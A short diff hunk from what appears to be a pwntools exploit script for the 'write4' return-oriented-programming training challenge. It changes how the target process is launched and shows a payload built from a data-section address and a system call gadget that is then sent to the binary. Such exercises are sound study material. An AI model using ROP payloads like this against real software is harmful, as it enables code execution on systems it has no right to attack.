@@ -35,7 +35,7 @@ payload += p64(data_section)
 payload += p64(system_call)
 
 
-io = process("./write4")
+io = e.process()
 
 
 io.sendline(payload)
